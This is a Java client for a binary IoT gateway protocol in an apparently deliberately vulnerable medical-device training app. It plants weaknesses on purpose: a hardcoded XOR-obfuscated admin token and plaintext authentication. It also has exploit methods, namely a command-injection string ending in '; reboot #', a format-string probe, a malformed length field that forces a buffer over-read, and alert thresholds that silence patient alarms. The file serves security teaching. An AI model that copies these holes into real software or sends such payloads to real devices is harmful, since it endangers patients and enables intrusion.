package com.vulnzoo.careotter_app;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

/**
 * IgpClient — IGP v4 (IoT Gateway Protocol) binary TCP client.
 *
 * Protocol header (8 bytes, big-endian):
 *   [Magic(4)=0x43415245 "CARE"] [Cmd(1)] [Status(1)=0x00] [Len(2)]
 * Payload immediately follows. Server closes connection after response.
 *
 * VULNERABILITIES:
 * 1. Credentials (auth token) sent in plaintext over TCP — no TLS
 * 2. Hardcoded XOR token visible via static analysis
 * 3. No server certificate / identity verification
 * 4. Stateful auth on server: one successful auth enables all connections
 */
public class IgpClient {

    private static final int    IGP_MAGIC      = 0x43415245; // "CARE"
    private static final int    DEFAULT_TIMEOUT = 3000;

    // VULNERABILITY: admin token XOR-obfuscated with key 0x5A — trivially reversible
    private static final byte[] ENCODED_TOKEN = {
        0x15, 0x2E, 0x2E, 0x3F, 0x28, 0x17, 0x35, 0x38,
        0x33, 0x36, 0x3F, 0x68, 0x6A, 0x68, 0x6C
    };

    // Commands
    public static final byte CMD_SYS_INFO        = 0x01;
    public static final byte CMD_AUTHENTICATE    = 0x02;
    public static final byte CMD_GET_NETWORK     = 0x03;
    public static final byte CMD_SET_PREFS       = 0x04;
    public static final byte CMD_VERIFY_STATUS   = 0x05;
    public static final byte CMD_SET_WIFI        = 0x06;
    public static final byte CMD_GET_VITALS      = 0x07;
    public static final byte CMD_SET_THRESHOLD   = 0x08;
    public static final byte CMD_REBOOT_SERVICE  = 0x09;
    public static final byte CMD_GET_LOG         = 0x0A;
    public static final byte CMD_DEFIBRILLATE    = 0x0B;
    public static final byte CMD_EMERGENCY_ALERT = 0x0C;
    public static final byte CMD_DEAUTHENTICATE  = 0x0D;
    public static final byte CMD_GET_THRESHOLD   = 0x0E;
    public static final byte CMD_PING            = 0x0F;
    public static final byte CMD_GET_SIGNATURE   = 0x10;

    private final String host;
    private final int    port;

    public IgpClient(String host, int port) {
        this.host = host;
        this.port = port;
    }

    /** Decode XOR-obfuscated admin token (intentional vuln). */
    public static String decodeToken() {
        byte[] result = new byte[ENCODED_TOKEN.length];
        for (int i = 0; i < ENCODED_TOKEN.length; i++) {
            result[i] = (byte) (ENCODED_TOKEN[i] ^ 0x5A);
        }
        return new String(result);
    }

    /** Send an IGP command and return the full response string. */
    public String send(byte cmd, byte[] payload) throws IOException {
        if (payload == null) payload = new byte[0];

        ByteBuffer header = ByteBuffer.allocate(8).order(ByteOrder.BIG_ENDIAN);
        header.putInt(IGP_MAGIC);
        header.put(cmd);
        header.put((byte) 0x00);
        header.putShort((short) payload.length);

        try (Socket socket = new Socket(host, port)) {
            socket.setSoTimeout(DEFAULT_TIMEOUT);
            OutputStream out = socket.getOutputStream();
            out.write(header.array());
            if (payload.length > 0) out.write(payload);
            out.flush();

            InputStream in   = socket.getInputStream();
            byte[]      buf  = new byte[4096];
            int         read = in.read(buf);
            return read > 0 ? new String(buf, 0, read) : "";
        }
    }

    // ── Convenience wrappers ─────────────────────────────────────────────────

    public String sysInfo()        throws IOException { return send(CMD_SYS_INFO, null); }
    public String authenticate()   throws IOException { return send(CMD_AUTHENTICATE, decodeToken().getBytes()); }
    public String getNetwork()     throws IOException { return send(CMD_GET_NETWORK, null); }
    public String getVitals()      throws IOException { return send(CMD_GET_VITALS, null); }
    public String getLog()         throws IOException { return send(CMD_GET_LOG, null); }
    public String getThresholds()  throws IOException { return send(CMD_GET_THRESHOLD, null); }
    public String ping()           throws IOException { return send(CMD_PING, null); }
    public String defibrillate()   throws IOException { return send(CMD_DEFIBRILLATE, "TRIGGER".getBytes()); }

    /**
     * 0x10 GET_SIGNATURE — retrieves the factory device signature.
     *
     * Requires prior authentication ({@link #authenticate()}).
     * The returned signature (e.g. "CareOtterFactorySig2026") is what the
     * installer/administrator must provide to the patient so they can register
     * the device in the Cloud API via POST /api/devices/register-by-hash.
     */
    public String getDeviceSignature() throws IOException {
        return send(CMD_GET_SIGNATURE, null);
    }

    /**
     * 0x0D DEAUTHENTICATE — resets authenticated=0 in the careservice process.
     * Call after every protected operation to close the administrator session
     * and minimize the window during which the global authenticated=1 state
     * can be exploited by other direct TCP clients on port 9999.
     */
    public String deauthenticate() throws IOException { return send(CMD_DEAUTHENTICATE, null); }

    public String verifyStatus(String module) throws IOException {
        return send(CMD_VERIFY_STATUS, module.getBytes());
    }

    public String sendEmergencyAlert(String message) throws IOException {
        return send(CMD_EMERGENCY_ALERT, message.getBytes());
    }

    /** VULNERABILITY: command injection — semicolons/pipes not sanitised server-side */
    public String exploitCommandInjection() throws IOException {
        return sendEmergencyAlert("alert'; reboot #");
    }

    /** VULNERABILITY: format string — %x tokens leak stack memory on server */
    public String exploitFormatString() throws IOException {
        return verifyStatus("%x.%x.%x.%x");
    }

    /**
     * VULNERABILITY: TLV integer underflow — Len=0xFF with only 4 bytes of value
     * triggers buffer over-read in parse_preferences() on the device.
     */
    public String exploitUnderflow() throws IOException {
        byte[] tlv = {
            (byte) 0xAA, (byte) 0xFF,
            0x44, 0x61, 0x72, 0x6B   // "Dark"
        };
        return send(CMD_SET_PREFS, tlv);
    }

    /** DarkMode preference TLV (benign). */
    public String setTheme() throws IOException {
        byte[] tlv = {
            (byte) 0xAA, 0x04,
            0x44, 0x61, 0x72, 0x6B   // "Dark"
        };
        return send(CMD_SET_PREFS, tlv);
    }

    /**
     * 0x08 SET_THRESHOLD — clinical alert thresholds (TLV).
     *
     * Wire layout (matches parse_thresholds in careservice.c):
     *   [0xBB][0x04][bpm_min hi][bpm_min lo][bpm_max hi][bpm_max lo]
     *   [0xCC][0x01][spo2_min]
     *
     * Server clamps each TLV by length, but performs NO clinical-range
     * validation — values like (0, 65535, 0) are accepted and propagated
     * to /var/log/careotter.thresholds, suppressing all alerts on the sensor.
     */
    public String setThreshold(int bpmMin, int bpmMax, int spo2Min) throws IOException {
        ByteBuffer tlv = ByteBuffer.allocate(9).order(ByteOrder.BIG_ENDIAN);
        tlv.put((byte) 0xBB);
        tlv.put((byte) 0x04);
        tlv.putShort((short) (bpmMin & 0xFFFF));
        tlv.putShort((short) (bpmMax & 0xFFFF));
        tlv.put((byte) 0xCC);
        tlv.put((byte) 0x01);
        tlv.put((byte) (spo2Min & 0xFF));
        return send(CMD_SET_THRESHOLD, tlv.array());
    }
}
